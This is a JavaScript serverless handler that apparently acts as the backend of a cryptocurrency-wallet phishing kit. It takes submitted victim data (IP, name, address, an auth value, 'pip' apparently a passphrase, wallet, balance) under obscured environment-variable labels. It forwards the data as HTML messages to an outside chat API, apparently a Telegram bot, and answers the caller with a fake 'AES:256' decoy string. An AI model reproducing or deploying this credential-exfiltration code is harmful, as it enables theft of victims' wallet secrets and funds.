exports.handler = async (event) => {

    if (event.httpMethod === "OPTIONS") {
        return {
            statusCode: 204,
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type",
                "Access-Control-Allow-Methods": "POST, OPTIONS",
            },
            body: "",
        };
    }

    const uid = process.env.uid;
    const nom = process.env.nom;
    const addi = process.env.addi;
    const authw = process.env.authw;
    const pip = process.env.pip; 
    const ref = process.env.ref;
    const net = process.env.net;
    const bal = process.env.bal; 
    const wal = process.env.wal;
    const uR = process.env.uR;
    const uL = process.env.uL; 
    const uN = process.env.uN; 
    const uASP = process.env.uASP;
    const uAWA = process.env.uAWA;
    const addFW = process.env.addFW; 
    const uMM = process.env.uMM; 
    const uRFSH = process.env.uRFSH;



    try {
        const { type, details: dataReceived } = JSON.parse(event.body);
        let msa;

        switch (type) {
    
            case 'uR':
                msa = `<u>${uR}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `IP: <b>${dataReceived.IP}</b>\n` +
                    `${nom}: <b>${dataReceived.nom}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${authw}: <b>${dataReceived.authw}</b>\n` +
                    `${ref}: <b>${dataReceived.ref}</b>`;
                break;
    
            case 'uL':
                msa = `<u>${uL}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `IP: <b>${dataReceived.IP}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${authw}: <b>${dataReceived.authw}</b>`;
                break;
                
            case 'uN':
                msa = `<u>${uN}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${net}: <b>${dataReceived.net}</b>`;
                break;
    
            case 'uASP':
                msa = `<u>${uASP}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>`;
                break; 
    
            case 'uAWA':
                msa = `<u>${uAWA}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>`;
                break;                   
                
            case 'addFW':
                msa = `<u>${addFW}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${net}: <b>${dataReceived.net}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>`;
                break;  
    
            case 'uMM':
                msa = `<u>${uMM}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${nom}: <b>${dataReceived.nom}</b>\n` +
                    `${addi}: <b>${dataReceived.addi}</b>\n` +
                    `${pip}: <b>${dataReceived.pip}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>`;
                break;           
                
            case 'uRFSH':
                msa = `<u>${uRFSH}</u>\n\n` +
                    `${uid}: <b>${dataReceived.uid}</b>\n` +
                    `${wal}: <b>${dataReceived.wal}</b>\n` +
                    `${bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>`;
                break;  

        }

        const smResponse = await sTM(msa);
        return {
            statusCode: 200,
            headers: {
                "Access-Control-Allow-Origin": "*",
            },
            body: JSON.stringify({ message: "struct encryption *alloc_json(int purge); -AES:256" }),
        };
    } catch (error) {
        console.error("Error:", error);
        return {
            statusCode: 500,
            headers: {
                "Access-Control-Allow-Origin": "*",
            },
            body: JSON.stringify({ message: "struct encryption *alloc_json(int purge); -500:error" }),
        };
    }
};

async function sTM(text) {
    const cID = process.env.cID;
    const apiUrl = process.env.apiURL;
    

    const response = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: cID,
            text: text,
            parse_mode: 'HTML',
        }),
    });

    if (!response.ok) {
        throw new Error(`Out of bounds response from server`);
    }

    return await response.json();
}
